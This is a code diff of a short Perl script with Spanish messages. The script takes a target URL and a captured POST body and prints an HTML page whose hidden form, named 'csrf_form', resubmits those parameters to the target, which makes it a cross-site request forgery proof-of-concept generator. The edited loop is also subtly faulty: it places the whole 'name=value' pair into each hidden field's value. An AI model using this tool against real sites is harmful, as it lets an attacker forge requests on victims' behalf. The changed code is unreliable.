@@ -7,7 +7,7 @@
 
 
 $url = $ARGV[0];
-print "[!] Pegue el contenido de Live HTTP Headers\n\n";
+print "[!] Pegue el contenido post (Live HTTP Headers, ZAP Proxy...)\n\n";
 $post = <STDIN>;
 chomp($post);
 print "\n\n";
@@ -16,8 +16,10 @@ print '<html><body>
   <form name="csrf_form" action="'.$url.'" method="POST">';
 @parametros = split("&", $post);
 foreach (@parametros) {
-@data = split("=", $_);
-print '<input type="hidden" name="'.$data[0].'" value="'.$data[1].'">'."\n";
+$aguja = index($_, "=");
+$value = $_;
+$parametro = substr($value, 0, $aguja);
+print '<input type="hidden" name="'.$parametro.'" value="'.$value.'">'."\n";
 }
 
 print ' </form>
